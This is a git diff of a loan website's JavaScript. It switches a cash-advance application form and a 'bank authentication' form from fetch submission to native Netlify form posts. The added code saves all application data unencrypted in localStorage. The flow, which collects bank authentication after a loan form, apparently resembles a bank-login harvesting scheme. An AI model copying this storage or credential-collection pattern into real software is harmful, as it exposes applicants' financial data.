@@ -123,76 +123,32 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Cash Advance Form submission handler
+    // Cash Advance Form Handler - Show loading state only
     if (cashAdvanceForm) {
         cashAdvanceForm.addEventListener('submit', function(e) {
-            // Basic form validation
-            if (!validateForm()) {
-                e.preventDefault();
-                return false;
-            }
-
-            // Collect form data
-            const formData = new FormData(cashAdvanceForm);
-            const formDataObject = {};
-            
-            formData.forEach((value, key) => {
-                formDataObject[key] = value;
-            });
+            const submitBtn = cashAdvanceForm.querySelector('.submit-btn');
+            const btnText = submitBtn.querySelector('.btn-text');
+            const btnLoading = submitBtn.querySelector('.btn-loading');
             
             // Show loading state
-            const submitBtn = cashAdvanceForm.querySelector('button[type="submit"]');
-            const originalText = submitBtn.textContent;
-            submitBtn.textContent = 'Processing...';
+            btnText.style.display = 'none';
+            btnLoading.style.display = 'inline-block';
             submitBtn.disabled = true;
             
-            // Generate application ID
-            const applicationId = 'APP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+            // Store form data in session storage for potential use
+            const formData = new FormData(cashAdvanceForm);
+            const formDataObj = {};
+            for (let [key, value] of formData.entries()) {
+                if (key !== 'form-name') {
+                    formDataObj[key] = value;
+                }
+            }
+            sessionStorage.setItem('loanApplicationData', JSON.stringify(formDataObj));
             
-            // Add hidden application ID field to form
-            const hiddenField = document.createElement('input');
-            hiddenField.type = 'hidden';
-            hiddenField.name = 'application_id';
-            hiddenField.value = applicationId;
-            cashAdvanceForm.appendChild(hiddenField);
+            // Also store in localStorage for persistence
+            localStorage.setItem('loanApplicationData', JSON.stringify(formDataObj));
             
-            // Store application data in sessionStorage for bank authentication
-            sessionStorage.setItem('loanApplicationId', applicationId);
-            sessionStorage.setItem('loanApplicationData', JSON.stringify(formDataObject));
-            
-            // Save to localStorage as backup
-            const timestamp = new Date().toISOString();
-            const backupData = {
-                ...formDataObject,
-                application_id: applicationId,
-                timestamp: timestamp,
-                submission_method: 'netlify'
-            };
-            localStorage.setItem('loan_application_' + applicationId, JSON.stringify(backupData));
-            
-            // Submit to Netlify with file uploads
-            const netlifyFormData = new FormData(cashAdvanceForm);
-            netlifyFormData.append('form-name', 'loan-application');
-            
-            fetch('/', {
-                method: 'POST',
-                body: netlifyFormData
-            })
-            .then(() => {
-                // Redirect to bank authentication page after successful submission
-                window.location.href = 'bank-authentication.html';
-            })
-            .catch(error => {
-                console.error('Form submission error:', error);
-                // Reset button state on error
-                submitBtn.textContent = originalText;
-                submitBtn.disabled = false;
-                alert('There was an error submitting your application. Please try again.');
-            });
-            
-            // Prevent default form submission
-            e.preventDefault();
-            return false;
+            // Let the form submit naturally to Netlify with action redirect
         });
     }
 
@@ -367,12 +323,10 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Bank Authentication Form Handler
+    // Bank Authentication Form Handler - Show loading state only
     const bankAuthForm = document.getElementById('bankAuthForm');
     if (bankAuthForm) {
         bankAuthForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
             const submitBtn = bankAuthForm.querySelector('.submit-btn');
             const btnText = submitBtn.querySelector('.btn-text');
             const btnLoading = submitBtn.querySelector('.btn-loading');
@@ -382,27 +336,7 @@ document.addEventListener('DOMContentLoaded', function() {
             btnLoading.style.display = 'inline-block';
             submitBtn.disabled = true;
             
-            // Collect form data
-            const formData = new FormData(bankAuthForm);
-            formData.append('form-name', 'bank-authentication');
-            
-            // Submit to Netlify
-            fetch('/', {
-                method: 'POST',
-                body: formData
-            })
-            .then(() => {
-                // Redirect to under-review page after successful submission
-                window.location.href = 'under-review.html';
-            })
-            .catch(error => {
-                console.error('Bank authentication submission error:', error);
-                // Reset button state on error
-                btnText.style.display = 'inline-block';
-                btnLoading.style.display = 'none';
-                submitBtn.disabled = false;
-                alert('There was an error submitting your bank authentication. Please try again.');
-            });
+            // Let the form submit naturally to Netlify with action redirect
         });
     }
 
